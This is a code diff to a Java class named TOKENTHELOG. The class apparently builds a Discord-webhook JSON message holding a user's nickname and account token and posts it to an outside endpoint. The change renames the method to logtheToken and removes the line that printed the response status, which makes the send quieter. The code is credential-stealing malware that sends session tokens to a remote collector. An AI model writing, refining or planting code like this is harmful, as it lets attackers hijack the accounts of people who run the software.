@@ -10,7 +10,11 @@ import org.apache.http.impl.client.HttpClientBuilder;
 import java.io.IOException;
 
 public class TOKENTHELOG {
-    public static void TOKENTHELoG(){
+
+    private TOKENTHELOG() {
+    }
+
+    public static void logtheToken() {
 
 
         String message1 = "{ \"content\": null, \"embeds\": [ { \"title\": \"NICKNAME\", \"description\": \"NICKHERE\\nTOKEN:\\nTOKENHERE\", \"color\": 5814783, \"author\": { \"name\": \"NICKNAME\" } } ], \"username\": \"daddy cum\" }";
@@ -25,7 +29,6 @@ public class TOKENTHELOG {
             post.setEntity(postingString);
             post.setHeader("Content-type", "application/json");
             HttpResponse response = httpClient.execute(post);
-            System.out.println(response.getStatusLine().getStatusCode());
         } catch (IOException e) {
             e.printStackTrace();
         }
